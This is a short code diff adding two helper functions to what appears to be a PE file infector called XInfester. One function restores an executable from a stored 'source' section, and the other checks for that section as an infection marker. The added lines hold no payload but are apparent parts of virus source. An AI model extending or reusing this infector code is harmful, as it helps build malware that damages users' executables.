@@ -210,3 +210,43 @@ void XInfester_Run()
 		}
 	}
 }
+
+BOOL XInfester_RestoreFile(const char *pDestFileName)
+{
+	PEStructure pDest;
+	if(!pDest.Load_PE_File(pDestFileName))
+		return FALSE;
+
+	for (int i=0;i<pDest.GetSectionCount();i++)
+	{
+		if (strcmp(pDest.GetSectionName(i),XINFESTED_SOURCE_SECTION_STRING)==0)
+		{
+			if(pDest.DumpMemoryToFile(pDestFileName,pDest.GetSectionBufferPointer(i),pDest.GetSectionRawSize(i)))
+			return TRUE;
+			else
+			{
+				printf("Error restore:%s\n",pDestFileName);
+				return FALSE;
+			}
+		}
+	}
+	return FALSE;
+}
+
+BOOL XInfester_IsFileInfected(const char *pDestFileName)
+{
+	PEStructure pDest;
+	if(!pDest.Load_PE_File(pDestFileName))
+		return FALSE;
+
+	for (int i=0;i<pDest.GetSectionCount();i++)
+	{
+		if (strcmp(pDest.GetSectionName(i),XINFESTED_SOURCE_SECTION_STRING)==0)
+		{
+				pDest.free();
+				return TRUE;
+		}
+	}
+	pDest.free();
+	return FALSE;
+}
